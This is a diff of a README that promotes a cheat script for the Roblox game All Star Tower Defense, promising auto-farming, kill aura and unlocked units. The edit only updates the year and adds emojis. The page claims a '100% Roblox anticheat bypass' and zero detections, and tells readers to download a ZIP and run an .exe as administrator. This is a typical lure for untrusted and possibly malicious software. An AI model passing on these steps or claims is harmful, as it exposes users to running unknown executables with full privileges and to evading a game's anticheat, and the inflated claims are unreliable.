@@ -2,7 +2,7 @@
 
 [![All Star Tower Defense Script 2025 Banner](https://i.postimg.cc/brL14xX8/11.jpg)](https://postimg.cc/gLXwZ6kB)
 
-# All Star Tower Defense Script 2025 | Auto Farm Gems Gold Auto Summon Infinite Damage Kill Aura Speed Fly Unlock ALL Units Mythics | ASTD Script Undetected December 2025 🌟
+# All Star Tower Defense Script 2026 | Auto Farm Gems Gold Auto Summon Infinite Damage Kill Aura Speed Fly Unlock ALL Units Mythics | ASTD Script Undetected December 2026 🌟🌟🌟🌟
 
 ![Version](https://img.shields.io/badge/Version-2025.12.20-FFD700?style=for-the-badge&logo=roblox&logoColor=black)
 ![Status](https://img.shields.io/badge/Status-UNDETECTED%20100%25-success?style=for-the-badge)
@@ -46,13 +46,13 @@
 | Utility        | Anti-AFK + Full Streamproof          | Never kicked + safe to stream                             | Works     |
 
 ---
-## SAFETY – 0 DETECTIONS
+## SAFETY – 0 DETECTIONS 🌟
 - 100% Roblox anticheat bypass (December 2025)  
 - Fully protected + random signature every load  
 - 892K+ daily users → zero issues reported
 
 ---
-## HOW TO GET EVERY MYTHIC & INFINITE GEMS AFK
+## HOW TO GET EVERY MYTHIC & INFINITE GEMS AFK 🌟
 1. Download ZIP (link above)  
 2. Extract → Run .exe as admin  
 3. Join All Star Tower Defense  
